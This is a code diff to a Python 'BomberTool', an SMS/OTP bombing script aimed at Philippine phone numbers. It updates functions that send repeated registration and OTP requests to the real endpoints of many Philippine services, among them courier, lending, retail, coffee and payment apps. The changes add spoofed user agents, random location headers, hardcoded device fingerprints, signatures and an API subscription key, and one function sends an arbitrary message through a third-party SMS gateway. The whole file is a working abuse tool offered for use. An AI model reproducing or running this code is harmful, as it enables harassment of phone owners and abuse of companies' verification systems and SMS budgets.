@@ -285,16 +285,18 @@ class BomberTool:
                 'Content-Type': 'application/json; charset=utf-8',
                 'accept-language': 'en-SG',
                 'region': 'PH',
+                'X-Country': 'PH',
             }
             data = {
-                'userName': fp,
+                'phone': f'63{fp}',
                 'phoneCode': '63',
-                'password': f'TempPass{random.randint(1000, 9999)}!'
+                'password': f'TempPass{random.randint(1000, 9999)}!',
+                'userName': fp,
             }
             r = requests.post(f'{self.osim_url}/register', headers=headers, json=data, timeout=8)
             if r.status_code == 200:
                 res = r.json()
-                if res.get('resultCode', 0) in [201000, 200000]:
+                if res.get('resultCode', 0) in [201000, 200000, 0]:
                     return True, res.get('message', 'Bomb sent')
                 return False, res.get('message', f"Code {res.get('resultCode')}")
             return False, f'HTTP {r.status_code}'
@@ -353,19 +355,21 @@ class BomberTool:
     def send_xpress(self, phone_number):
         try:
             fp = self.format_phone(phone_number)
-            ts = int(time.time())
+            ts = int(time.time() * 1000)
             headers = {
                 'User-Agent': 'Dalvik/2.1.0',
                 'Content-Type': 'application/json',
                 'Accept': 'application/json'
             }
             data = {
-                'FirstName': f'User{ts}',
-                'LastName': 'Test',
+                'FirstName': 'user',
+                'LastName': 'test',
                 'Email': f'user{ts}@gmail.com',
                 'Phone': f'+63{fp}',
-                'Password': f'Pass{random.randint(1000, 9999)}',
-                'ConfirmPassword': f'Pass{random.randint(1000, 9999)}'
+                'Password': 'Pass1234',
+                'ConfirmPassword': 'Pass1234',
+                'FingerprintVisitorId': 'TPt0yCuOFim3N3rzvrL1',
+                'FingerprintRequestId': '1757149666261.Rr1VvG',
             }
             r = requests.post(
                 'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
@@ -385,11 +389,13 @@ class BomberTool:
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Accept': 'application/json',
             }
+            data = {
+                'contact_no': fp,
+                'login_token': 'undefined'
+            }
             r = requests.post(
                 'https://api.mobile.abenson.com/api/public/membership/activate_otp',
-                headers=headers,
-                data=f'contact_no={fp}&login_token=undefined',
-                timeout=8
+                headers=headers, data=data, timeout=8
             )
             if r.status_code == 200:
                 return True, 'OTP sent'
@@ -400,14 +406,24 @@ class BomberTool:
     def send_excellent_lending(self, phone_number):
         try:
             fp = self.format_phone(phone_number)
+            coordinates = [
+                {'lat': '14.5995', 'long': '120.9842'},
+                {'lat': '14.6760', 'long': '121.0437'},
+                {'lat': '14.8648', 'long': '121.0418'}
+            ]
+            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
+            coord = random.choice(coordinates)
             headers = {
-                'User-Agent': 'okhttp/4.12.0',
+                'User-Agent': random.choice(agents),
                 'Content-Type': 'application/json; charset=utf-8',
-                'Accept': 'application/json',
+                'x-latitude': coord['lat'],
+                'x-longitude': coord['long'],
             }
             data = {
-                'login': fp,
-                'deviceId': _rs(32),
+                'domain': f'0{fp}',
+                'cat': 'login',
+                'previous': False,
+                'financial': 'efe35521e51f924efcad5d61d61072a9'
             }
             r = requests.post(
                 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
@@ -422,25 +438,36 @@ class BomberTool:
     def send_bistro(self, phone_number):
         try:
             fp = self.format_phone(phone_number)
+            uid = _rs(28)
+            device_id = _rs(16)
+            command_array = [
+                'free.text.sms', '421', f'+63{fp}',
+                '2207117BPG',
+                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
+                'You have a new message -freed0m'
+            ]
+            import json as _json
+            from urllib.parse import urlencode
             headers = {
-                'Host': 'bistrobff-adminservice.arlo.com.ph:9001',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 16; CPH2465) AppleWebKit/537.36',
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Origin': 'http://localhost',
-                'X-Requested-With': 'com.allcardtech.bistro',
-                'Referer': 'http://localhost/',
-                'Accept-Language': 'en-US,en;q=0.9',
+                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
+                'Connection': 'Keep-Alive',
+                'Content-Type': 'application/x-www-form-urlencoded'
             }
-            r = requests.get(
-                f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{fp}',
-                headers=headers, timeout=8
+            data = {
+                'UID': uid,
+                'humottaee': 'Processing',
+                'Email': f'{_rs(8)}@gmail.com',
+                '$Oj0O%K7zi2j18E': _json.dumps(command_array),
+                'device_id': device_id,
+                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
+                'Name': 'User'
+            }
+            r = requests.post(
+                'https://sms.m2techtronix.com/v13/sms.php',
+                headers=headers, data=urlencode(data), timeout=10
             )
             if r.status_code == 200:
-                resp = r.json()
-                if resp.get('isSuccessful'):
-                    return True, 'OTP sent'
-                return False, resp.get('message', 'API Error')
+                return True, 'SMS sent'
             return False, f'HTTP {r.status_code}'
         except Exception as e:
             return False, f'Error: {str(e)[:50]}'
@@ -448,18 +475,19 @@ class BomberTool:
     def send_bayad(self, phone_number):
         try:
             fp = self.format_phone(phone_number)
+            ts = int(time.time() * 1000)
             headers = {
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'en-US',
+                'User-Agent': 'okhttp/4.9.2',
+                'Accept': 'application/json',
                 'Content-Type': 'application/json',
-                'Origin': 'https://www.online.bayad.com',
-                'Referer': 'https://www.online.bayad.com/',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36',
-                'x-api-key': 'B4y4dC3nt3r2024xApiKey',
             }
-            data = {'mobileNumber': f'+63{fp}'}
+            data = {
+                'businessId': 'BAYAD',
+                'contactNumber': f'0{fp}',
+                'appsflyerIdentifier': f'{ts}-{random.randint(10**18, 10**19 - 1)}'
+            }
             r = requests.post(
-                'https://apiv2.bayad.com/api/auth/send-otp',
+                'https://gateway.ezloancash.ph/security/auth/otp/request',
                 headers=headers, json=data, timeout=8
             )
             if r.status_code == 200:
@@ -472,18 +500,19 @@ class BomberTool:
         try:
             fp = self.format_phone(phone_number)
             headers = {
-                'User-Agent': 'okhttp/4.9.3',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json',
-                'x-api-key': 'lbc-connect-2024',
+                'User-Agent': 'Dart/2.19 (dart:io)',
+                'Content-Type': 'application/x-www-form-urlencoded',
             }
             data = {
-                'mobileNumber': f'0{fp}',
-                'channel': 'SMS',
+                'verification_type': 'mobile',
+                'client_email': f'{_rs(8)}@gmail.com',
+                'client_contact_code': '+63',
+                'client_contact_no': fp,
+                'app_log_uid': _rs(16),
             }
             r = requests.post(
-                'https://api.lbcconnect.com/v1/auth/otp/send',
-                headers=headers, json=data, timeout=8
+                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
+                headers=headers, data=data, timeout=8
             )
             if r.status_code == 200:
                 return True, 'OTP sent'
@@ -494,17 +523,17 @@ class BomberTool:
     def send_pickup_coffee(self, phone_number):
         try:
             fp = self.format_phone(phone_number)
+            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
             headers = {
-                'User-Agent': 'PickUpCoffee/3.0 (Android)',
+                'User-Agent': random.choice(agents),
                 'Content-Type': 'application/json',
-                'Accept': 'application/json',
             }
             data = {
-                'phone': f'+63{fp}',
-                'type': 'register',
+                'mobile_number': f'+63{fp}',
+                'login_method': 'mobile_number'
             }
             r = requests.post(
-                'https://api.pickupcoffee.ph/v1/users/otp',
+                'https://production.api.pickup-coffee.net/v2/customers/login',
                 headers=headers, json=data, timeout=8
             )
             if r.status_code in [200, 201]:
@@ -517,19 +546,15 @@ class BomberTool:
         try:
             fp = self.format_phone(phone_number)
             headers = {
-                'User-Agent': 'okhttp/4.10.0',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                 'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'x-platform': 'android',
-                'x-version': '1.5.0',
             }
             data = {
-                'phone': fp,
-                'countryCode': '+63',
-                'deviceId': _rs(32),
+                'phone': f'0{fp}',
+                'is_rights_block_accepted': 1
             }
             r = requests.post(
-                'https://api.honeyloan.ph/app/v1/auth/otp/request',
+                'https://api.honeyloan.ph/api/client/registration/step-one',
                 headers=headers, json=data, timeout=8
             )
             if r.status_code == 200:
@@ -541,23 +566,18 @@ class BomberTool:
     def send_kumu_ph(self, phone_number):
         try:
             fp = self.format_phone(phone_number)
-            timestamp = int(time.time())
-            random_str = _rs(16)
-            signature = self.generate_kumu_signature(timestamp, random_str, fp)
             headers = {
-                'User-Agent': 'kumu/4.0.0 (Android)',
                 'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'x-kumu-timestamp': str(timestamp),
-                'x-kumu-nonce': random_str,
-                'x-kumu-signature': signature,
+                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
+                'Ocp-Apim-Subscription-Key': 'cfde6d2109154bb7ae63d1662e9a1958',
+                'User-Agent': 'Dart/3.6 (dart:io)',
             }
             data = {
-                'phone': f'+63{fp}',
-                'purpose': 'REGISTER',
+                'mobileNumber': f'+63{fp}',
+                'channel': 'SMS',
             }
             r = requests.post(
-                'https://api.kumu.live/v3/auth/phone/otp',
+                'https://api.komo.ph/v1/otp/send',
                 headers=headers, json=data, timeout=8
             )
             if r.status_code == 200:
@@ -570,17 +590,20 @@ class BomberTool:
         try:
             fp = self.format_phone(phone_number)
             headers = {
-                'User-Agent': 'S5App/2.1 (Android)',
+                'User-Agent': 'Dart/3.6 (dart:io)',
                 'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'x-app-id': 's5-ph-mobile',
+                'app-type': 'GOOGLE_PLAY',
+                'authorization': 'Bearer',
             }
             data = {
-                'mobile': f'+63{fp}',
-                'action': 'register',
+                'deviceId': 'c31a9bc0-652d-11f0-88cf-9d4076456969',
+                'deviceType': 'GOOGLE_PLAY',
+                'companyId': '4bf735e97269421a80b82359e7dc2288',
+                'dialCode': '+63',
+                'phoneNumber': fp,
             }
             r = requests.post(
-                'https://api.s5.com/ph/v1/otp/send',
+                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                 headers=headers, json=data, timeout=8
             )
             if r.status_code == 200:
@@ -593,19 +616,18 @@ class BomberTool:
         try:
             fp = self.format_phone(phone_number)
             headers = {
-                'User-Agent': 'Cashalo/5.0 (Android)',
+                'User-Agent': 'okhttp/4.9.3',
                 'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'x-cashalo-platform': 'android',
-                'x-cashalo-version': '5.0.1',
+                'xuid_type': 'user',
+                'source': 'customer',
+                'authorization': 'Bearer',
             }
             data = {
-                'mobileNumber': f'+63{fp}',
-                'type': 'REGISTRATION',
-                'deviceId': _rs(32),
+                'phone_country': '+63',
+                'phone_no': fp,
             }
             r = requests.post(
-                'https://api.cashalo.com/v2/auth/otp/request',
+                'https://api.wemove.com.ph/auth/users',
                 headers=headers, json=data, timeout=8
             )
             if r.status_code == 200:
